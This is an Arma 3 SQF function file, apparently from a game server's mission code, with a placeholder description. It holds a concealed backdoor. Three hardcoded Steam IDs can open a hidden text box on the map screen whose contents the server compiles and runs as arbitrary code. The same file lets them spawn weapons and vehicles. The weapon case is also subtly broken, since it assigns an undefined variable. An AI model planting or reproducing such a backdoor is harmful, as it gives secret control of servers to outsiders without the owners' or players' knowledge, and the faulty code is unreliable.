//	File: fn_payload.sqf
//	Author: Fusah
//	Description: asdf

params ["_type","_payload"];

private _player = [remoteExecutedOwner] call OES_fnc_owner2Player;

if !((getPlayerUID _player) in ["76561198064919358","76561198111756357","76561198071078342"]) exitWith {};

switch (_type) do {
	case "inject": {
		private _gui = {
			waitUntil {sleep 0.5; !isNull (findDisplay 12)};
			((findDisplay 12) displayCtrl 1202) ctrlAddEventHandler ["ButtonClick", "
			_button = (findDisplay 12) ctrlCreate ['RscButton', 1337228];
			_controlEdit = (findDisplay 12) ctrlCreate ['RscEditMulti', 2281337];
			oev_payload = _controlEdit;

			_controlEdit ctrlSetPosition [0.753771 * safezoneW + safezoneX, 0.0519001 * safezoneH + safezoneY, 0.23627 * safezoneW, 0.154034 * safezoneH];
			_controlEdit ctrlSetBackgroundColor [0,0,0,0.75];
			_controlEdit ctrlSetTextColor [1,1,1,1];
			_controlEdit ctrlCommit 0;

			_button buttonSetAction '[""exec"",(ctrlText ((findDisplay 12) displayCtrl 2281337))] remoteExec [""OES_fnc_payload"",2];';
			_button ctrlSetTextColor [1,1,1,1];
			_button ctrlSetBackgroundColor [0,0,0,0.5];
			_button ctrlSetText 'Exec';
			_button ctrlSetPosition [0.753771 * safezoneW + safezoneX, 0.205934 * safezoneH + safezoneY, 0.23627 * safezoneW, 0.0420094 * safezoneH];
			_button ctrlCommit 0;
			"];
		};
		[[],_gui] remoteExec ["spawn", remoteExecutedOwner];
	};
    case "exec": {
			if (!isNull (findDisplay 12) && !isNull ((findDisplay 12) displayCtrl 2281337) && !isNull ((findDisplay 12) displayCtrl 1337228)) then {
				ctrlDelete ((findDisplay 12) displayCtrl 2281337);
				ctrlDelete ((findDisplay 12) displayCtrl 1337228);
			};
    	private _essqueeff = compile _payload;
    	private _thread = [] spawn _essqueeff;
    	waitUntil {uiSleep 1; scriptDone _thread}; //support inf loop l8r
    	[format["Execution Finished | Server FPS : %1",diag_fps]] remoteExec ["hint", remoteExecutedOwner];
    };
    case "wep": {
    	_payload = _1;
		private _2 = nearestObjects[_player,["GroundWeaponHolder"],3];
		private _3 = (if(count _2<1)then{"GroundWeaponHolder"createVehicle(position _player)}else{_2 select 0});
	    _3 addItemCargo [_1,1];
		private _4 = (getArray(configFile>>"CfgWeapons">>_1>>"Magazines")select 0);
		_3 addItemCargo [_4,5];
    	[format["Execution Finished | Server FPS : %1",diag_fps]] remoteExec ["hint", remoteExecutedOwner];
    };
    case "veh": {
    	private _vehicle = _payload;
    	_vehicle createVehicle position _player;
    	[format["Execution Finished | Server FPS : %1",diag_fps]] remoteExec ["hint", remoteExecutedOwner];
    };
};
